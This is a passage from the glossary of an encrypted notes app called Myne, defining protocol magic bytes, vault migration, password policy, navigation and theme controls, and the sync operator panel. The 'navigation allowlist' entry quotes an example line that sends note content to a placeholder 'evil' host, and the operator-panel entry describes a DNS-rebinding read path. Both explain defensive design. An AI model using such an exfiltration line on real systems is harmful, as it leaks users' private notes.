The user-initiated upgrade procedure between major protocol versions (e.g., v0.1 → v0.2). Always explicit, never automatic, never silent. Since the [birth format](#birth-format) moved to v0.2 (`decisions.md` 2026-08-13) this applies only to vaults **created before** that change — a new vault is already v0.2 and has nothing to migrate. The next-major client decrypts the v0.1 vault end-to-end, generates a new `root_key`, builds the next major version's key hierarchy, re-encrypts every blob under the new keys with the new magic bytes, and rewrites `vault.meta`. v0.1 clients never produce later-version output. For the first concrete cut (v0.1 → v0.2, the `NC05` note-type), §10.4.1 pins the contract: the recovery phrase is **required** (a password-only migration would strand recovery), the re-encrypt is **eager / whole-vault**, `vault.meta`→`NTV5` is the atomic commit point, and a [legacy snapshot](#legacy-snapshot) is retained until the user confirms (then crypto-erased).

Used in: `spec/protocol.md` §10.4, §10.4.1

### **MIN_PASSWORD_LEN** &nbsp; 🛠️ *Tooling*

Project-wide minimum number of Unicode characters a master password must contain before any Argon2id-bound auth-pipeline plugin (`vault_creation`, `vault_recover`, `vault_change_password`) accepts it. Phase 1 value: `12`. Defined in `protocol::password_policy`; mirrored by the frontend `PasswordForm` component (TS hand-mirror; Phase-1-end CI drift check planned). A **structural floor against trivial bypass** (e.g., DevTools-IPC manipulation), not an entropy guarantee — entropy gating (zxcvbn) is deliberately frontend-only per `decisions.md` 2026-05-06 "Auth-pipeline backend MIN_PASSWORD_LEN floor; project-wide retroactive". Counts via `str::chars().count()`, not UTF-8 byte length.

Used in: `protocol/src/password_policy.rs`, `decisions.md` 2026-05-06.

### **MLS (Messaging Layer Security)** &nbsp; 🏗️ *Construction*

The IETF group-key-agreement protocol standardized as RFC 9420. Myne plans to use MLS in a later major version for multi-device and multi-user group key management. Not used in v0.1.

Used in: `spec/protocol.md` §11 (out of scope for v0.1)
Reference: RFC 9420.

### **navigation allowlist** &nbsp; 🛠️ *Tooling*

The host-side rule that refuses every WebView navigation to an origin that is not the app's own. A `on_navigation` hook in each Tauri client (`src-tauri/src/navigation.rs`, `mobile/src-tauri/src/navigation.rs`), **not** a CSP directive, and that distinction is the reason it exists: no engine implements a directive that governs a top-level navigation (`navigate-to` was dropped from the spec, and `default-src` falls back only for fetch directives), so no policy written in `tauri.conf.json` can refuse `location = "https://evil/?d=" + noteBody`. The fetch half of that channel is closed by `connect-src`; this closes the navigation half. Landed desktop-side with `decisions.md` 2026-08-04 (entry 0445) and mobile-side with 2026-08-15 (entry 0502).

Three limits are part of the term rather than caveats on it. On Windows the hook sees only top-level navigations, so a sub-frame is bounded by `frame-src` alone. On **Android** the hook is `WebViewClient.shouldOverrideUrlLoading`, which the platform does not call for POST, so a form submission is invisible to the allowlist and is bounded by `form-action 'none'` instead: the allowlist and that directive are complementary, not redundant. And in a dev build the frontend is served by Vite rather than the `tauri://` protocol handler, so no CSP is attached at all and the allowlist is the only one of these controls that runs.

Distinct from the [value-shape allowlist](#value-shape-allowlist), which constrains what a custom theme may *say*, not where the app may *go*.

Used in: `threat-model.md` §7; `decisions.md` 2026-08-04, 2026-08-15

### **next major version (post-v0.1)** &nbsp; 📦 *Product*

*(Aliases: historically drafted as "v005" / "appname-v005"; `design-notes.md` is append-only and preserves that spelling verbatim — a reader who meets "v005" there maps it here.)*

The aspirational long-term protocol specification that succeeds v0.1, drawn from the founder's research and to be authored as a dedicated roadmap spec under `spec/`. Introduces post-quantum hybrid wrap (X25519 + ML-KEM-768), MLS multi-device, OPAQUE aPAKE, Key Transparency, OHTTP transport, KVAC anonymous credentials, Yjs-based real-time collaboration, and other v0.1-out-of-scope features. Cross-major migration from v0.1 to the next major version is explicit and one-way (`spec/protocol.md` §10.4).

Used in: `decisions.md` (Doc strategy = Option C)

### **NFKD normalization** &nbsp; 🏗️ *Construction*

Unicode Normalization Form KD (compatibility decomposition). Applied to recovery-phrase input and account-number input before hashing or feeding to Argon2id (`spec/protocol.md` §3.1, §7.4; `spec/account-number.md` §5). Ensures visually-identical inputs produced by different keyboard layouts hash to the same bytes.

Used in: `spec/protocol.md` §3.1, §7.4

### **nonce** &nbsp; 📋 *Protocol*

A non-repeating value used with a key in an encryption scheme. Myne nonces are 192-bit random values from the OS CSPRNG, drawn fresh for each AEAD call and stored alongside the ciphertext on disk. The 192-bit width makes random-nonce collisions negligible at any realistic vault size, removing the operational burden of nonce uniqueness tracking.

Used in: `spec/protocol.md` §5.3

### **native-messaging host** &nbsp; 📋 *Protocol*

The small Rust stdio host in the Tauri core that receives a keyless clip handoff from the [browser clipper](#browser-clipper) and pipes it into the existing `note_create` / `attachment_import` pipeline. Allowlists the exact extension ID and treats every handed-off byte as hostile input (size caps, UTF-8 validation, no path traversal, re-sniffed MIME, rate limits). Defines trust boundary TB10.

### **note anchor** &nbsp; 📦 *Product*

*(Alias: `ConversationEntry.note_id`.)*

The note a [conversation](#conversation) is about, when it is about one: an optional note id on the conversation's catalog row, written at creation when a run starts with a single note in its [agent scope](#agent-scope). A field on the existing row rather than a new blob family, deliberately — the catalog already syncs, so the [agent hub](#agent-hub) lists anchors without opening every conversation file. A conversation without one is **vault-general**, which is the hub's own case and not a degraded state. The anchor is a label, never a permission: it says what a conversation was about and grants nothing, and what a run may touch is the [agent scope](#agent-scope) alone.

Used in: `protocol.md` §9.23; `decisions/ai/0634`

### **note-task** &nbsp; 📦 *Product*

A whole note the user has declared a unit of work, marked by the value-strict `kind: task` frontmatter field (`spec/markdown-dialect.md` §3.6.1). Distinct from a [line-task](#line-task), which is a single `- [ ]` line inside any note: a note-task is the note itself.

The declaration is deliberate and explicit — a note carrying a due date is **not** a task, because otherwise every meeting note with a date would silently become one. Completion is recorded by [`done:`](#done), and the complete action is **gated on the marker**: completing a note that is not a task would produce state no surface lists.

Unlike the sibling `kind: drawing`, the marker does **not** change the render surface — a note-task's body is ordinary markdown — so it needs no Rust mirror. It surfaces as a muted marker in the sidebar row and the tab, hideable via the `show_task_marker` preference.

Used in: `spec/markdown-dialect.md` §3.6.1; `decisions.md` 2026-07-28

### **note template** &nbsp; 📦 *Product*

A reusable note skeleton the user picks at note-creation time. Stored as an ordinary AEAD-sealed [`.myn`](#myn-file) note carrying the value-strict Myne-managed `template:` flag (`spec/markdown-dialect.md` §3.6.1) — **not** a `vault.prefs` field, so it inherits the 16 MiB/note ceiling, per-note fault isolation, and a free [UUIDv7](#note_uuid) identity (rename-safe; the template's name is its `title:` field, its content is the note body). A note template is the inverse-visibility twin of [Trash](#trash): excluded from the sidebar file-tree, folder-tree, and search, surfaced **only** in the template picker and the management UI. Location-agnostic (no target-folder baked in) and minimal: no declared-variables field — the [template variable](#template-variable) engine infers `{{...}}` tokens from the body at fill time. Myne ships **none** — a fresh vault has zero templates (start-empty). See [markdown-dialect.md](spec/markdown-dialect.md) §3.6.1 (`template:` row), [decisions.md](decisions.md) 2026-06-07 (MYND-186).

Used in: `spec/markdown-dialect.md` §3.6.1; `decisions.md` 2026-06-07 (MYND-186)

### **note_uuid** &nbsp; 🗝️ *Key/identifier*

The unique identifier of a note. UUIDv7 in v0.1 (time-ordered, naturally sortable). Used as the filename on disk (with the `.myn` extension) and bound into the AAD of content encryption. UUIDv7's millisecond-resolution time component leaks creation-time bucket; a later version may switch to UUIDv4 if even this is unacceptable.

Used in: `spec/protocol.md` §9.1, §5.2

### **NoteId** &nbsp; 🗝️ *Key/identifier* (*Myne-divergent*)

Host-side newtype around the per-note UUIDv7 (`note_uuid`). Generated server-side by the `note_create` Tauri command (`NoteId::new_v7`) and returned to the UI as the canonical lowercase-hyphenated 36-char form; the UI never produces a `NoteId` — only consumes the string returned by `note_create` and passes it back unchanged to subsequent reads/updates. `NoteId::parse(&str)` is **strict**: 36 chars + lowercase ASCII letter/digit/hyphen + hyphens at fixed positions 8/13/18/23 + `uuid::Uuid::parse_str` succeeds + `version_num == 7`. Each rejection routes through a `pub(crate) InvalidNoteIdCause` (5 sub-causes) emitted via `tracing::debug!` for ops debugging, then collapses to the single public `InvalidNoteId` IPC variant per the unlock-error-discipline boundary policy (`decisions.md` 2026-04-26). The strict contract delivers three structural defenses: path-traversal becomes impossible (no UI string reaches a path component without `parse` succeeding), filesystem case-sensitivity inconsistency between APFS / ext4 is structurally prevented, and the backend-gen v7-only contract is double-pinned (a v4 UUID submitted by a buggy/hostile UI is rejected at `WrongVersion` before any path concat).

Used in: `spec/protocol.md` §9.1, §5.2; `decisions.md` 2026-05-07 "Note UUIDv7 backend-gen" + "NoteId strict parse"; `core/src/plugins/notes/note_id.rs`

### **model artefact origin** &nbsp; 📦 *Product*

`downloads.myne.md`, Myne's own static artefact origin, which hosts the AI model weights the desktop client fetches on demand rather than bundling (myne-md/myne#805; `decisions/ai/0628`). Distinct from a [remote AI provider](#remote-ai-provider) and from a [local model runtime](#local-model-runtime): a fetch from this origin carries no note content and no credential, only a request for a named model file, so the only thing it can reveal is that this device chose to fetch a model. The trust anchor is a SHA-256 **compiled into the client binary**, never the origin's own `SHA256SUMS` or `index.json` (which are discovery and display only), so a tampered origin cannot serve bytes that agree with the check. The origin keeps no IP logs and no analytics (threat-model **TB14**). The non-LLM utility models (OCR, Whisper) stay bundled; only the LLM-shaped embeddings and tag weights are downloaded.

Used in: `decisions/ai/0628`; `threat-model.md` §3 TB14, §7; `src-tauri/src/plugins/local_inference/download.rs`

### **Myne markdown dialect (D1)** &nbsp; 📦 *Product* (deep entry, *Myne-divergent*)

The markdown dialect Myne v0.1 reads and writes: **GFM (GitHub-Flavored Markdown) plus a footnote extension plus a wikilink extension plus YAML frontmatter recognition**. Internally referenced as **D1**. Codified in `spec/markdown-dialect.md`. The dialect is selected as the smallest pin that covers Myne v0.1's editor decoration commitments (tables, task lists, footnotes, wikilinks, frontmatter) while preserving byte-stable round-trip with Obsidian-imported notes (`vision.md` Phase 1 importer commitment). Two alternatives were considered and declined in `decisions.md` 2026-05-01: D2 (D1 + Pandoc extras — declined because the extras are not load-bearing for v0.1 and Obsidian renders them as raw text) and D3 (Djot — declined because `.dj` is not markdown and would break the "walk away into any markdown editor" wedge). Hard rule **C1**: vault imports never silently rewrite content; non-canonical syntax in imported notes is preserved byte-for-byte. Forward-incompatible with the next major version by design — a later version will pin its own dialect.

### **Myne Sync** &nbsp; 📦 *Product*

The commercial name of the [hosted sync](#hosted-sync) paid plan — deliberately a **single** plan: 20 GB deduplicated-ciphertext quota (AS17) and 10 devices per account (`decisions.md` 2026-07-13; price points are business-sensitive and live outside this repo). One plan because hosted and self-hosted share TB5: the only honest differentiators are quantitative (storage + devices). Prepaid and time-based — a voucher extends `paid_until`; there is **no auto-renewal**, because nothing identity-bearing is kept on file for an anonymous account. Expiry runs the [read-only grace](#read-only-grace) ladder.

Used in: `decisions.md` 2026-07-13

### **Myne-managed canonical frontmatter field** &nbsp; 📋 *Protocol*

A YAML frontmatter field whose value is written by the Myne dialect surgery module (`src/dialect/surgery.ts`) rather than left purely user-authored. v0.1 defines **thirteen** such fields, enumerated in `markdown-dialect.md` §3.6.1 and exported as the single `MANAGED_FRONTMATTER_FIELDS` constant (`dialect/src/managedFields.ts`) that the importers' reject list consumes: `updated` / `title` / `folder` / `trashed` / `template` / `folder_index` / `kind` / `done` / `archived` / `cover` / `deleted` / `conflict` / `conflict_of`. The first two are the original pair — `updated` (RFC 3339 string, UTC, **autosave-driven** — overwritten on every `note_update` via `patchUpdatedField` to record the user's last-edit timestamp on the device) and `title` (YAML string scalar, **rename-driven** — overwritten only when the user renames a note from the sidebar AND the read-precedence chain resolves to the frontmatter slot, via `patchTitleField`; the `<NoteRow>` sidebar reads from the same field per the mirror-existing source-of-truth decision tree). All are **unprefixed** (no `myne_` namespace) to align with Obsidian / Logseq / Bear convention and the `PRODUCT.md` plain-markdown-portability commitment. Other frontmatter fields (`tags:`, user-defined keys) are user-authored and preserved per `markdown-dialect.md` §3.6 "Unknown frontmatter fields are preserved on write." The set of Myne-managed canonical fields is forward-incompatible-by-design with a later major version.

Used in: `spec/markdown-dialect.md` §3.6.1; `decisions.md` 2026-05-07 "User-meaningful timestamp storage path"; `decisions.md` 2026-05-15 "Note title write target"

### **myne-decrypt** &nbsp; 🛠️ *Tooling*

The app-independent decrypter (myne-md/myne#166): a standalone Rust CLI, shipped as four minisign-signed native binaries (macOS universal, Linux x64, Linux arm64, Windows x64) on `downloads.myne.md` in the same tag as `myne`, that reads a vault (or a `.myne-backup` container) and writes the notes and attachments out as plain markdown without the app installed. It is the escape hatch behind the no-lock-in commitment (`vision.md`): "plain markdown" is only true after decryption, so walking away without the app requires a tool that decrypts. It covers both on-disk format generations (v0.1 and `NC05`), exports best-effort with an honest accounting of what it could not read (the [`_undecodable/`](#_undecodable) salvage directory + a `_FAILED.txt` manifest), and describes itself without claiming a verifiability the private source cannot deliver. It reads the on-disk format through the [`format/` crate](#format-crate).

Used in: `decisions.md` 2026-09-07 (myne-md/myne#166)

### **`myne.v0.1` prefix** &nbsp; 📋 *Protocol* (deep entry, *Myne-divergent*)

The literal string `"myne.v0.1 "` (with trailing space) used as the prefix for HKDF context strings in §3.2 of the protocol. Distinct from the AAD prefix `"myne.v0.1|"` (with trailing pipe, no space) used in AAD construction in §5.2. The two prefixes are deliberately non-identical because they live in different cryptographic call sites — context strings feed `info` to HKDF-Expand, while AAD bytes feed Poly1305 MAC and the CTX outer hash. Mistakenly using one for the other is a protocol violation. The next major version defines its own context-string and AAD prefixes (not pre-allocated).

Used in: `spec/protocol.md` §3.2, §5.2, §10.3

### **MYA1** &nbsp; 📋 *Protocol*

The 4-byte ASCII magic identifying a v0.1 [attachment](#attachment) blob (`spec/protocol.md` §9.9). Part of the v0.1 magic family; registered in §10.3's magic-allocation table with its next-major-reserved sibling `MYA5`. An `MYA1` blob reuses the `.myn` three-level wrap (per-attachment key under `itemsKey`), single-shot AEAD, 64 MiB cap. Implementations MUST reject any candidate attachment blob whose first four bytes are not `MYA1`.

### **MYC1** &nbsp; 📋 *Protocol*

The 4-byte ASCII magic identifying the v0.1 [`vault.attachments`](#vaultattachments) catalog blob (`spec/protocol.md` §9.10), the authoritative per-attachment metadata store. A `MYP1`-style 34-byte envelope over canonical JSON; KEK `DeriveSubkey(root_key, "attachments-catalog-key")`. Registered in §10.3 with its next-major-reserved sibling `MYC5`. The "C" is for *catalog* — chosen after the initial `MYI1` proposal collided with the already-reserved VaultIndices magic (`decisions.md` 2026-06-07).

### **MYE1** &nbsp; 📋 *Protocol*

The 4-byte ASCII magic identifying a v0.1 [extracted-attachment-text](#attachment-text-extraction) blob (`spec/protocol.md` §9.15), the per-attachment search-extraction cache at `attachments-text/<attachment-id-hex>`. A `MYS1`-style 34-byte envelope over a postcard payload; KEK `DeriveSubkey(root_key, "attachment-text-key")`, with the AAD additionally binding the [attachment-id](#attachment-id) and the [extractor version](#extractor-version). Like [`MYS1`](#mys1) it is a rebuildable cache — [fall to rebuild](#fall-to-rebuild) (here: re-extract from the source [`MYA1`](#mya1)) on any rejection rather than treating it as data loss. Registered in §10.3 with its next-major-reserved sibling `MYE5`. The "E" is for *extracted*. Implementations MUST reject any candidate blob whose first four bytes are not `MYE1`. (MYND-328)

### **MYG1** &nbsp; 📋 *Protocol*

The 4-byte ASCII magic identifying a v0.1 [`vault.graph`](#vaultgraph) blob (`spec/protocol.md` §9.19) — the encrypted-at-rest knowledge-graph layout cache (node positions + a schema-version marker). Parallel to `MYS1` (search) / `MYI1` (indices) / `MYR1` (embeddings) in the v0.1 magic-byte family; a **distinct family** (one magic per family). `G` = **G**raph. A pure rebuildable cache — [fall to rebuild](#fall-to-rebuild) (re-run the force layout) on any rejection rather than treating it as data loss. KEK `DeriveSubkey(root_key, "graph-layout-key")`; [rebuildable-cache](#sync-artefact-classes) Class 3, so **never synced and never backed up**. Registered in §10.3 alongside its next-major-reserved sibling `MYG5`. Implementations MUST reject any candidate `vault.graph` whose first four bytes do not match `MYG1`.

### **MYI1** &nbsp; 📋 *Protocol*

The 4-byte ASCII magic identifying a v0.1 [`vault.indices`](#vaultindices) blob (`spec/protocol.md` §9.8) — the encrypted-at-rest structured-metadata index (wikilink graph + tag index + title resolution + typed [property](#property) records). Parallel to `MYS1` (search) / `MYW1` (workspace) in the v0.1 magic-byte family; the structural twin of `MYS1` but a **distinct family** (one magic per family). The magic was **reserved by VaultIndices since 2026-06-07 (MYND-31)** — which is why the attachments catalog took `MYC1` after its initial `MYI1` proposal collided — and the blob spec landed with MYND-271. Registered in §10.3 alongside its next-major-reserved sibling `MYI5`. Implementations MUST reject any candidate `vault.indices` whose first four bytes do not match `MYI1` — and [fall to rebuild](#fall-to-rebuild) rather than treating the rejection as data loss.

### **MYP1** &nbsp; 📋 *Protocol*

The 4-byte ASCII magic identifying a v0.1 `vault.prefs` blob. Parallel to `MY01` (per-note) and `MYV1` (vault metadata) in the v0.1 magic-byte family. Registered in `spec/protocol.md` §10.3's major-version registry alongside its next-major-reserved sibling `MYP5`. Implementations MUST reject any candidate `vault.prefs` whose first four bytes do not match `MYP1`.

Used in: `spec/protocol.md` §9.5, §10.3

### **MYR1** &nbsp; 📋 *Protocol*

The 4-byte ASCII magic identifying a v0.1 [`vault.embeddings`](#vaultembeddings) blob (`spec/protocol.md` §9.17) — the encrypted-at-rest on-device AI embedding index (semantic-search / Q&A vectors, MYND-453). Parallel to `MYS1` (search) / `MYI1` (indices) in the v0.1 magic-byte family; a **distinct family** (one magic per family). `R` = **R**etrieval/RAG (the natural `E`-for-embeddings letter was already taken by `MYE1`, extracted-attachment-text). Registered in `spec/protocol.md` §10.3 alongside its next-major-reserved sibling `MYR5`. Written only when the runtime beta opt-in `ai_enabled` is on (AI ships in the default build as of `decisions.md` 2026-07-02; a `--no-default-features` build never compiles the AI path and never writes it). Implementations MUST reject any candidate `vault.embeddings` whose first four bytes do not match `MYR1` — and [fall to rebuild](#fall-to-rebuild) (re-embed) rather than treating the rejection as data loss.

### **MYS1** &nbsp; 📋 *Protocol*

The 4-byte ASCII magic identifying a v0.1 `vault.search` (search-index) blob. Parallel to `MY01` (per-note), `MYV1` (vault metadata), and `MYP1` (preferences) in the v0.1 magic-byte family. Registered in `spec/protocol.md` §10.3's major-version registry alongside its next-major-reserved sibling `MYS5`. Implementations MUST reject any candidate `vault.search` whose first four bytes do not match `MYS1` — and [fall to rebuild](#fall-to-rebuild) rather than treating the rejection as data loss.

Used in: `spec/protocol.md` §9.6, §10.3

### **MYW1** &nbsp; 📋 *Protocol*

The 4-byte ASCII magic identifying a v0.1 `vault.workspace` ([workspace-state blob](#workspace-state-blob)). Parallel to `MY01` (per-note), `MYV1` (vault metadata), `MYP1` (preferences), and `MYS1` (search) in the v0.1 magic-byte family. Registered in `spec/protocol.md` §10.3's major-version registry alongside its next-major-reserved sibling `MYW5`. Implementations MUST reject any candidate `vault.workspace` whose first four bytes do not match `MYW1` — and fall back to the default (single empty pane) workspace rather than treating the rejection as data loss.

Used in: `spec/protocol.md` §9.7, §10.3

### **`.myn` file** &nbsp; 📦 *Product*

Myne Note: the binary encrypted blob holding a single note. File extension `.myn`, magic bytes `MY01` for v0.1. Layout in `spec/protocol.md` §9.2: header, items_key_id, item_key_nonce, length-prefixed `enc_item_key`, content_nonce, length-prefixed ciphertext + CTX tag.

Used in: `spec/protocol.md` §9.1, §9.2

### **OPFS (origin private file system)** &nbsp; 📦 *Product* (*Myne-divergent*)

The browser's private, origin-scoped filesystem — the Phase 3 web client's local vault storage, and the analogue of the desktop vault directory. Three properties make it *not* a drop-in replacement, and each drives a design decision: it offers **no crash-atomicity guarantee** and Safari implements no `move()` at all, so singleton blobs are written as a [double-buffered blob](#double-buffered-blob) rather than by atomic rename; its synchronous access handles are **dedicated-worker-only** in every browser, which is why the wasm core and all vault IO live in a Worker; and it is **evictable** and scoped to the origin *and* the browsing profile, which makes storage loss an ordinary event the client treats as re-sync rather than as data loss. The blob *format* stored in it is byte-identical to the desktop's; only the container layout diverges.

Used in: `decisions.md` 2026-07-26 (OPFS container layout); `spec/sync-protocol.md` §4.1, §6.2, §9

### **OPAQUE** &nbsp; 🏗️ *Construction*

The aPAKE protocol standardized as RFC 9807 (March 2025). Server stores no offline-brute-forceable password verifier. Myne's later-major-version roadmap canonicalizes OPAQUE for sync-server authentication. Phase 2 will choose between OPAQUE and a simple-verifier alternative; the choice is documented in `spec/protocol.md` §11.1 with criteria for resolution.

Used in: `spec/protocol.md` §11.1
Reference: RFC 9807.

### **operator console** &nbsp; 📦 *Product*

The hosted-sync admin surface (`decisions.md` 2026-07-13; **built 2026-07-15, MYND-506**): an admin API bound to a **Unix domain socket** (`MYNE_ADMIN_SOCKET` — no bearer secret; access is filesystem permissions; disabled by default) plus a `myne-server admin` CLI (thin client). Its browser counterpart is the [operator panel](#operator-panel), on a separate listener over the same projection; the two are independent and neither requires the other. Normative posture: the console is a **live projection of already-persisted enforcement state only** — account hash, stored bytes, device count, policy fields — never a new observation channel: no request history, no last-seen wall-clocks, no per-account time series (upholding the MYND-440 aggregate-only-metrics invariant). Shipped enforcement: `list`/`show`/`stats` + `freeze`/`unfreeze`/`set-quota`/`set-max-devices`/`delete` (`plan_id`/`paid_until` reserved for MYND-430 billing). Open-source and shipped to self-hosters like every other component; hosted gets no proprietary tooling. The client-facing counterpart is the authed, token-derived [account status endpoint](#account-status-endpoint). Enforcement state persists in the [account policy store](#account-policy-store).

Used in: `decisions.md` 2026-07-13, 2026-07-15

### **operator panel** &nbsp; 📦 *Product*

The browser surface of the [operator console](#operator-console) (`myne-md/myne#787`; `decisions.md` entries 0309 and 0318 named it, 2026-09-28 built it): a stdlib `html/template` page served by `myne-server` itself on its own listener, gated by `MYNE_ADMIN_PANEL_ADDR` (**disabled by default**). It exists because a browser cannot dial the console's Unix domain socket, and `spec/server-protocol.md` §7 keeps that socket off TCP.

**Read-only, structurally**: its route table registers the read verbs only, so no write route is reachable on its listener and there is no **state-changing** cross-origin surface. `freeze`/`unfreeze`/quota/device-cap/`delete` stay on the socket and the CLI. Reads the store in-process, so `MYNE_ADMIN_PANEL_ADDR` alone is sufficient. **No authentication and no request log of any kind** (the discarded stdlib error log is paired with panic recovery, per `server-protocol.md` §5.2), which keeps it inside `self-host-policy.md` §3's no-IP prohibition. An **instantaneous projection**: nothing is stored between requests and no time value appears in its output, which is a rule about the projection rather than a fact about the store, since the server does hold `created_at` at millisecond resolution (AS6). It is **per-account by construction**, so it keeps the no-time-series half of the MYND-440 aggregate-only invariant and not the no-per-account-label half; it adds no new **persistence**, and that is the claim it supports.

**Its only access control is a `Host` allowlist** (`MYNE_ADMIN_PANEL_HOSTS`; empty means loopback names). Read-only removes the state-changing cross-origin surface, not the read one: a rebound hostname is **same-origin to the hostile page**, and browsers send no `Origin` on a GET, so neither the same-origin policy nor an origin check survives a rebind. The listener also **serves plain HTTP and terminates no TLS**, so a non-loopback bind puts the roster on the wire in the clear, and the bind address is not validated (one startup warning, no refusal). The **hash is the selector for the pre-auth `GET /vault.meta` route**, which returns each account's offline cracking target, so the roster is a list of credentials and the panel is a third **A16**-shaped local ingress.

Network-bindable at an operator-chosen address, **never the public edge**, and not validated: a non-loopback bind prints one startup warning naming the resolved address and is not refused, because the same knob on `/metrics` has legitimate non-loopback uses. It can render the account hash, stored bytes, device count, frozen state and the quota/device-ceiling overrides, plus the deployment totals. It **cannot render an account number because none exists on the server** (AS9: the raw number never crosses the wire, the server holds `SHA-256(canonical_form)[:16]`). That is not the same as saying the roster is harmless: the hash is the pre-auth `GET /vault.meta` selector, so it is worth what the account number is worth. Wears the default Myne palette with system fonts; a custom theme cannot apply, and the reason is **ownership**, not encryption (one theme blob per vault, a multi-tenant server, and a B2B vault has an owner plus members, so there is no single theme to read). Ships to every operator including self-hosters; **hosted gets no proprietary tooling**, and whether anything panel-shaped is reachable from the hosted origin is an open `operations` decision.

Used in: `decisions.md` 2026-07-13, 2026-09-28; `spec/server-protocol.md` §7.0b

### **account policy store** &nbsp; 📦 *Product*

The sparse top-level `accounts.json` file (server root, `decisions.md` 2026-07-15; MYND-506) holding per-account operator enforcement policy — `{frozen, quota_override_bytes, max_devices_override, plan_id (reserved), paid_until_day (reserved)}` keyed by [account_number_hash](#account_number_hash). Server-side **plaintext** operator metadata of the same class as the already-visible device count / stored-byte size (AS16/AS17) — never user content. Mirrors `auth.json` (in-memory map + consistent-cut atomic snapshot + coalescing flusher; no magic byte, `schema_version`, forward-incompatible-by-design with a later major version). **Sparse**: only accounts with non-default policy keep an entry (absence = all defaults). Read by the request-path enforcement (quota guard, enroll cap, push/enroll freeze) and by the [operator console](#operator-console). **Not synced** (operator policy, not user data); captured by the [built-in backup](#built-in-backup) (same volume).

Used in: `decisions.md` 2026-07-15; `spec/server-protocol.md` §7

### **account status endpoint** &nbsp; 📋 *Protocol*

`GET /account/status` (`decisions.md` 2026-07-15; MYND-506; `spec/server-protocol.md` §7 / §7.1): the authed, client-facing counterpart to the [operator console](#operator-console). Returns the caller's own `{stored_bytes, device_count, frozen, quota_bytes, max_devices}`. The account is **resolved from the device token — never from the URL or query** (an identifier there is ignored), so the account number never appears in a request line or log. Both ceilings are **effective** — resolved through the same function the enforcement guard uses, so a reported ceiling and a refusal cannot disagree — and **`0` means unlimited**, never a ceiling of zero (`decisions.md` 2026-07-26; MYND-570). Surfaced in Settings → Sync on desktop and mobile since MYND-570; `plan_id` / `paid_until_day` stay reserved to MYND-430 and are not exposed.

Used in: `decisions.md` 2026-07-15; `spec/server-protocol.md` §7

### **optimistic UI rollback** &nbsp; 📦 *Product*

The UI pattern where a state change (sidebar row appended, removed, title overwritten) is applied to the local React cache **before** the underlying Tauri IPC call resolves, giving the user instant feedback. On IPC rejection (disk full, vault locked mid-save, structural error) the change is reverted from the cache and the user is informed via a non-blocking error toast. Myne uses optimistic UI rollback in three sidebar paths per `decisions.md` 2026-05-15 "Save-handler discipline": `createNote` (row appended optimistically), `deleteNote` (row removed optimistically), `renameNote` (title overwritten optimistically). `saveNote` (autosave) is **not** optimistic — body autosave doesn't typically alter the sidebar's title row, and the BottomBar save-status indicator (`SaveStatus` component, `Saving…` → `Saved · 2s ago` / `Save failed · Retry`) provides feedback without preempting the IPC. The pattern requires a paired rollback discipline at every optimistic call site; an IPC-rejected optimistic action that doesn't rollback is a UX-state-corruption bug.

Used in: `decisions.md` 2026-05-15; MYND-82

### **ordinal rule** &nbsp; 📦 *Product*

One of the two [recurrence rule](#recurrence-rule) families — the **calendar-anchored** one: `first monday of every month`, `last friday of every month`, `day 31 of every month`, `last day of every month`. Also called the calendar family.

**It does not drift.** Where the nominal position does not exist in a month, that occurrence clamps and the *next* one returns to the nominal position: `day 31` gives 28 February and then **31 March**, where the [interval rule](#interval-rule) family would have given 28 March. That contrast is the whole reason both families exist. An ordinal position a month cannot hold (`fourth monday` in a month with only four Mondays already used) clamps **back** a week rather than spilling into the next month.

The family a rule belongs to is fixed by the rule's shape, so the user chooses the behaviour by choosing the rule — there is no setting, and Myne never infers.

Used in: `spec/markdown-dialect.md` §3.8.7; `decisions.md` 2026-07-28

### **ornament primitive** &nbsp; 📦 *Product*

One of the nine generic visual parts a [custom theme](#custom-theme) may select to decorate a surface: **frame**, **shadow**, **texture**, **ruled ground**, **edge**, **corner fold**, **ribbon**, **perforation**, **tint wash**. Each takes one of a small enumerated set of values (`frame: none | hairline | thick | double | inset`), and the theme supplies only that selection plus its parameters — Myne owns what the selection draws.

**The parts are deliberately generic, never named objects.** There is no `polaroid` primitive; a polaroid is thick frame + hard shadow + paper texture, and the same nine parts also produce a notebook page (ruled ground + left perforation) or a brutalist card (thick frame + offset shadow + grain). Named combinations exist only as convenience presets in the website theme builder, which write generic values — no such name enters Myne's code or product vocabulary.

**Why this shape rather than letting a theme write CSS.** The WebView CSP carries `style-src 'unsafe-inline'`, so a theme value that reaches the DOM executes; the value-shape allowlist is therefore the primary security control (`threat-model.md` "Custom-theme CSS-value surface"). A primitive selection is a bare keyword and a parameter is `<number><unit>` — both already admissible — so pseudo-elements, composite shadows and textures become expressible while the allowlist stays byte-identical. See [paint layer](#paint-layer) for the integrity half of the rule.

Used in: `decisions.md` 2026-08-06; `spec/protocol.md` §9.21

### **ornament role** &nbsp; 📦 *Product*

The scope at which an [ornament primitive](#ornament-primitive) is chosen. Three roles: **surface** (page and panel grounds), **box** (callouts, code blocks, quotes, cards), **chrome** (tabs, buttons, bars). A component declares its role; the theme sets ornament per role rather than per element.

The alternative — one ornament setting per element — would put several hundred keys in a theme file (twenty-three callout types alone), making both the file and the builder unusable. Role scoping keeps the vocabulary near thirty keys. Colour is unaffected: a callout still takes its colour from its own type's tone, and only ornament is role-scoped. A per-element override is deliberately deferred and is additive when it lands, since an absent key already falls back.

Used in: `decisions.md` 2026-08-06

### **orphan vault artefact** &nbsp; 📋 *Protocol*

A residual file under `<app_data_dir>/vault/` that survives a partial-fail `vault_delete` — most often an orphan `.myn` blob (plus its containing `notes/` + `vault/` directories) left when `vault.meta` was unlinked successfully but a later unlink hit a file lock (antivirus / Spotlight / OneDrive sync), or a `vault.meta.tmp` / `vault.prefs.tmp` mid-write tempfile from an interrupted `atomic_write`. Once `vault.meta` is gone the artefacts are computationally-unrecoverable junk (the `items_key` that sealed each `.myn` left with it), yet they block a fresh `vault_create` (the `vault_artifacts_present` guard) and cannot be removed by `vault_delete` (which rejects `VaultNotFound` when `vault.meta` is absent). In-app cleanup is the v0.2 `vault_repair` feature, which sweeps everything under `vault_dir` while leaving the create-able container (MYND-159; `decisions.md` 2026-06-06 "vault_repair v0.2"). *Alias: vault residue.*

Used in: `decisions.md` 2026-05-26 "vault_delete partial-fail posture", 2026-06-06 "vault_repair v0.2"; MYND-105, MYND-159

### **paint layer** &nbsp; 📦 *Product*

